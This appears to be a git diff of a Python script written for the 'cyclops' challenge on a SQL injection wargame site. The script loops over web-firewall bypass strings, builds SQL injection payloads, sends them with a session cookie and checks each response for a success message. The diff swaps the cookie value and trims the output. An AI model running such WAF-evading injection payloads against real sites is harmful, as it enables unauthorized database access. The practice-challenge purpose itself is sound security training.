@@ -96,7 +96,7 @@ bypass_list[6]
 
 url = "https://modsec.rubiya.kr/chall/cyclops_9d6a565d1cb6c38a06a6b0815344e29e.php"
 params = {'id': None}
-cookies = {'PHPSESSID' : 'mckb6uj8ldfsho123g0u5jkokp'}
+cookies = {'PHPSESSID' : '595dl7ejl1io50mt9bhg0dbmpk'}
 
 for bypass in bypass_list:
     # url에 바로 넣기 (인코딩 추가로 안함)
@@ -105,14 +105,9 @@ for bypass in bypass_list:
     payload2="'<@=1 {} 'first','second'#".format(bypass)
     response = requests.get(url+payload1,cookies=cookies)
     if("CYCLOPS Clear" in response.text):
-        print("may be success")
+        #print("may be success")
         print(payload1)
-        print(response.text)
+        #print(response.text)
 
-    params["id"] = payload2
-    response = requests.get(url,params=params,cookies=cookies)
-    if("CYCLOPS Clear" in response.text):
-        print("may be success2")
-        print(payload2)
-        print(response.text)
+
     
